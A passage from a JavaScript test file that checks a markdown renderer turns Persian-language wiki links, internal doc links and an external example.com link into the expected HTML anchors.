پیوند اینترنتی [وب‌سایت](https://example.com)
`;
      const html = await renderMarkdown(input, { linkResolver });

      assert.match(html, /<a href="\/garden\/matrices" class="wiki-link">عملیات ماتریسی<\/a>/);
      assert.match(html, /<a href="\/docs\/guide">راهنما<\/a>/);
      assert.match(html, /<a href="https:\/\/example\.com">وب‌سایت<\/a>/);
    });
  });

});
